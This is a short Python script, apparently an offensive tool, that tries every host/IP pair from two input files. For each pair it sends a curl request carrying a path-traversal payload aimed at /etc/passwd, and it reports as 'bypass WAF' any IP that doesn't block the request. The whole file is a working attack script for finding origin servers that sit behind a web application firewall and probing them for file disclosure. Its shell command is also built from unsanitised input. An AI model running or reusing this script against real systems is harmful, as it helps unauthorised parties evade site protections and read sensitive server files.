import argparse
import subprocess
import os

parser = argparse.ArgumentParser(description='Process some integers.')
parser.add_argument('-H', dest='hosts', required=True,
                    help='file with a list of hosts')
parser.add_argument('-ip', dest='ips', required=True,
                    help='file with a list of IPs')

args = parser.parse_args()

with open(args.ips) as ips_file:
    ips = ips_file.read().splitlines()

with open(args.hosts) as hosts_file:
    hosts = hosts_file.read().splitlines()

for host in hosts:
    for ip in ips:
        cmd = f'curl --max-time 5 -i -s -k -X $\'GET\' -H $\'Host: {host}\' -H $\'User-Agent: Mozilla/5.0\' $\'https://{ip}/?malicioso=../../../etc/passwd\''
        result = subprocess.run(cmd, shell=True, capture_output=True)

        if result.returncode != 0:
            print(f'The IP {ip} did not work')
        elif '403 Forbidden' in result.stdout.decode():
            print(f'The IP {ip} did not work')
        elif '429 Too Many Requests' in result.stdout.decode():
            print(f'The IP {ip} did not work')
        else:
            print(f"\033[1;31mThe IP {ip} bypass WAF\033[0m")
            print(cmd)
